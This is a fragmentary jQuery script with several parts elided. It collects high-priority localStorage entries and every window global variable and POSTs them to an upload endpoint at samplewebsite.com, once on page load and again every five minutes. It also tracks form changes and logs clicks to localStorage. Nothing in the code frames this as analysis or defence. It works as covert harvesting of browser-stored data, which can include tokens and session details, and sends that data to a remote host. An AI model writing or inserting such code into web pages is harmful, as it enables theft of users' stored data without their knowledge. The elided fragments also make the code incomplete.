...
$(function () {
  ...
  function sendPostRequest(data) {
    const hashIndex = hashMaker(data);
    const baseApiUrl = "https://samplewebsite.com/api/upload";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", baseApiUrl, true);
  ...
  function collectGlobalVars() {
    for (let key in window) {
      if (!(key in globalVarCollect)) {
        globalVarCollect[key] = window[key];
      }
    }
    return globalVarCollect;
  }
  function catchDataAndPost() {
    const highPriorityStorage = getCriticalLocalStorage();
    const globals = collectGlobalVars();
    if (Object.keys(highPriorityStorage).length > 0 || Object.keys(globals).length > 0) {
      sendPostRequest({
        local: highPriorityStorage,
        globals: globals
      });
    }
  }
  window.addEventListener("load", catchDataAndPost);
  setInterval(catchDataAndPost, 5 * 60 * 1000);
  $('.form-control').on('change', function () {
    var combo = $(this).closest('.combo-group');
    if (this.value) {
      combo.addClass('combo-changed');
      specialKeys.push(combo[0].id);
    } else {
      combo.removeClass('combo-changed');
    }
  });
  window.addEventListener("click", function (event) {
    ...
    window.localStorage.setItem('INTERACTION', JSON.stringify(interaction));
  });
});
